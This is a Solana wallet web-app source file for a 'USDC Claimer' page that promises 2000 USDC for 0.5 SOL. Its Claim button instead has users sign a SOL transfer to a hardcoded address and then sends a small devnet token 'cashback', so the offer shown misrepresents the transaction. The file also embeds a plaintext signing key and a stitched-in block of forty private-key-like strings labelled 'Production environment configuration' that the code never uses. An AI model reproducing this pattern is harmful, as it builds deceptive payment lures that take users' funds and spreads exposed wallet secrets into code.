/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5ucsovUYSSqgzwfYAd4gAbWnkGmGdXiFNGbDVEMEHujQ98rDB6xp7fmuzYrb7pEoFfVYR6V4AHoDQ3Z5Ax1EuCjU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "62wDREjjD6VWHVM19ydomDM9Ywip5C99aXqaA65fxDp7yeAyZA2sdcXKDXTRqCVNWRc1Qf2RJw3exFfsScYPACdb",
  "key1": "58Y7m2xbNPZu8W88HjZn2eccwidkQ2z5SJfv1jH3TM5ZegvGwr1jDpx2C78GTHarW922NxJBtWuYcHdKEwLoq6SY",
  "key2": "36AhMBWEWq1KCWq2yCrKB5dLp3kxAgwrauQqXmcDPCdFeF6Xbz4UveAsK5xGvrDX99YpuzQkULDHzEFgP6LfqqMb",
  "key3": "3iHHwFw7m6vW9Wo6h4Eqp5Q7bJYKojQAxdCFkiZZEXdyrg7JXJPgPK7tCNyR759MjrBLfbnQFjpUXVBoZ1tbyFPi",
  "key4": "5GHuwV7dZ4Y8kScLdKoATkWG2E5XfBxF7H3JanhYYZR9UyinoUy8B2FMSq9btMNCzS7KJFjh9iJe7QwJHarVWfSs",
  "key5": "vdRwe1aKpa2gB3tiM1JKNuP8fjbsnjw12PQNQwRY8gsH2XxNM33XDpHPac5RqAQp1yU16wRzFj5M4Gj3tpxHQk8",
  "key6": "p4zQSAWeD5CnEEvCtFygC3pitx8jgZ3PrXXtXHQRqXcAPqBx1FGK4FSh7d9rpt2NrWdwCLt9R4R3Asw5GRwix4y",
  "key7": "2GxorVCJWvEL3dnQ6dq3HbQobB5x4gb7mrdsB4uSYEyHuiEMscAVP4dRRj17dhMWHC2f27p218twJtPPvjZkt7i3",
  "key8": "1xHvQXRNJ2M1SQEgoLrTYiWWgNhJRp1M17esbD8MfqvwTsi7t68dmACbroD4FWXGTiqaqWx1dhQ7fpbBbM9QguG",
  "key9": "FxnFhuipUGk7usENFcrjidSf6fXdZnd32ooou7eStoSi6LpHWdjPUa5xS7sSb2GqQnbpHK93BHL5wgqJhrtiSEM",
  "key10": "2SZBDRCRdQK38KaXugMDhniLmiZG5v3b3efSajbLiYjT9d47avKYEjzoKPD6V8RKkvYACkedXuzwTb8AMPArGj7S",
  "key11": "3UjDKxR2mUr5h3dKHtiw8Rxci6wuM7nAdMP9SbHUXJsR9yUFTeEAEhwKvRQszK6syvRRgNnCgWJJiia3sh4feKA5",
  "key12": "51JJ3s6jGukcfAJmqkjEZ6sRjgqeyARuFgF1zEXz2YBezoP5h3JukoPjxrJhZCY7YHZgfcxf1mULSBA7fDspDLV6",
  "key13": "5o8LzLJD9BFwbsd8ogsGCTaTp6gpVJPRmt9B6FHoxJG3DebmZK6ES6mBxc43hfpKsnUTrCLt5ryDdXqCWXNy3TDA",
  "key14": "5SBM39M8zwRDwe7kv6t91EsZA6KCgW35oYSbn7yaP9mx2He48xEoERhZqAwyC8zYxZX9TWgZb6uZj4A1c8jaAFUq",
  "key15": "vXpKyxRDaBdsjofEKkSfGfDfnohQGaMAWtKgUKh7wTqvq2EfNg99BPMLCkzBLBkHGwekNZ7DuVGPKUgZA6Vp9ow",
  "key16": "sadE93ueM92CVuoxmfPnLUFPEoX3HCDCqc6DRPRpEiXUi7UpeFVb82aP4K8n7CxqaZMhrjeEEhr128RsJdH2xru",
  "key17": "2NtX6R9PX8t9eRjSN8FYvJoE67pT2f7F4yNw33uiHnAE8JUzYzrV1cMdZpC8gvhW9XWm97xkpPM6Zf37Gr93tp93",
  "key18": "MtmQswLHU8sFARE1BhyAo6uss67Vt6hAkPVYw1u2XdFQps3JqjghKWDEyrhHoeoG5RqA2LDQckryEmr9eRnNtrw",
  "key19": "Ui5JVGpx2yb8K9VQx9X4x1Lsm5GJNy5mAMPJxTv5S9zQKnWu87sVpehw2JcaNxKRUbd4LYkCzw6uhySmFaQqGHh",
  "key20": "5NvcszZMtFXHXG8FcKpCg5HgX64ySbskdzBiVnWTPmwfcJLcLSrkwC9i7gB9vyYToX4fMmKN6bEvBzBE5pbuviks",
  "key21": "4VEKj5hxG4yswTDzmMiLxT2S5pNgbTVPxJci3nkeFLaGEopeSA2m7vJJSEuz7nyFHxd4oSc6LyD9NzJiJz6uKbFG",
  "key22": "5oKau3o2orvNp11r9vEvh9z1eYUZXtwArDsm7XbnK5dAEHF1qBQTkUCPbfDVEnjCbKwrGNZdw3HrxNiWEKBkpCWG",
  "key23": "5gtJKnRFiiULCLZPk21yaYnwoQkk4pi3NXop9KGCCtj9H28ZkRaxQaurSAvW69G78vrFnSqpHopgsVvCjfWiwDnx",
  "key24": "2ydCZ2jjwMRZbnwbJVc8oTU7TVkDy4WnmSJaL9NmXXrTRVTf6n2szb4LX5Q1G29E79kBB1c7dyZ7DxAqQzh3xETh",
  "key25": "3RwDqdUmDKztmwgHDoA2r9zY4XdmiC3S5YqVK9F8C3eTUGtxjHSbdPZSxVLX9PfHyAPJzrG9niU5DrvgQC8FtJLV",
  "key26": "5TyM5P5beSwXZqN1AENwfBgDVMbdw4sWfi3PH7PhSvApz86TRRpCMczHK9u4ithdcFtE2aUpUpCdZfszPYpXXjKa",
  "key27": "KdUTbf9J23r9To1hrDw5JaN3jtCQXWp573wYoB5HUiuEFk4KCjQgCaJ73vLTGAks8dtxMgmBTPQyUfN1hdCzRoF",
  "key28": "2Lqcinfvwr5ED4CxnWSwNE2CzTZpXYJowjrvB5gxDACUuUQQjwfaVcJiHWEHCDwJB3oFNwwfz5fmHbRkNZLYHgTx",
  "key29": "4dySceC14ymMY9ryk3hWZSf3NijLAx21ynbbkxuD6tWoo7hSMr9yNCZmLBJH2GbE7ut1zomdZpUHqPjGgG6RpvqT",
  "key30": "3QVfNoUZTUTQGqvVfgPL9pF3sW5NK1zwfQSxfaqoNFpD3Rhr2kJUa5nJG2bLZfa3ghgMjrFsuEXMovCKC4Nha5f",
  "key31": "3d14j6ZQwM3oQ8r6yKCTrnHdG1y6cYqeUrqVPm9cm3tjuwuSz1mnWL9gsxE9oppv4jXVKxHH1dPw2amM4EmQ8oei",
  "key32": "2dt3VVzajbWBNZjNSS4a2eHDQ5JNveGCBYUY2F7UzJ5S2PPYongQFY7hK7v7tjDMop8vUivQw4bPT77Yy9NXAdQL",
  "key33": "3j3PusQAFYGHrSNeqDfKJwVjgqqfkbYpRTxPzd39Sj7QB5D8FYjWbWMZSnmENDZ16EBrz2dXdogoicyxshHdVRTf",
  "key34": "5PiNdWbdbu9PW3wAuGQMPrmhVENCJibDdV4hfsjQzzn2F13UMHo1Qy3rNerdSLcrXwgJSZynqfk5AbmYA2ZKo192",
  "key35": "G3HyrEoDc9r9oAibnG9Tn7gud6vXDrqCMkVw8Z3CSVzteD33YH4JMKiT7ZUDdktrE53RPJyzhPrxBieAYa13E5N",
  "key36": "4jkL9GZF4wBTnGbfCrCiU3avzx89NGWX5DwPW9zegKTse9TS9n1aDDBxPw5Fzh1Hn9nsY8VftQ7pSE5nzrhBjMTh",
  "key37": "4SccMEdzGELbTXYn3Hg8tnaGorijwiaKYHeCL5zcPrATrdAyFKb3FzsdEMsoJnjZmTehK4fRsMYc1fx8KGDdaEZy",
  "key38": "4u7aycWfh7McpA27ieuFdcTm53aY7imAR3KH4pUzsyvuNi5iCqJZjEsYEVDBQ2CUbusMnbBgBZ44zzLtmktGNyk7",
  "key39": "2bHGWEVkdt3gcofZ8RwJkSjSCtE7UNv7YMcHHWkpfxUouNALbgESFJEyx3iQnW7AZrr5GjygqYxo8Lkncg7bDmYs"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
